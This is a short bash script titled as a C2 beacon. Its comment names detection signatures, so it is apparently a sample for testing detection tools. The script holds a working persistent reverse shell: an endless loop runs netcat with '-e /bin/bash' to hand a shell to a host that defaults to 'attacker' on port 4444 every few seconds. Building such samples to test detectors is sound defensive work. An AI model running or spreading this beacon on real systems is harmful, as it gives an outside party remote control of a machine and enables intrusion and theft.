#!/bin/bash
# C2 Beacon — persistent callback loop
# Detectable by: signature scan (Beacon.Loop.Generic), behavioral (C2_COMMUNICATION)
C2="${1:-attacker}"
PORT="${2:-4444}"
INTERVAL="${3:-5}"

echo "[*] Starting beacon loop to ${C2}:${PORT} every ${INTERVAL}s"
while true; do
    nc -w 2 "$C2" "$PORT" -e /bin/bash 2>/dev/null || true
    sleep "$INTERVAL"
done
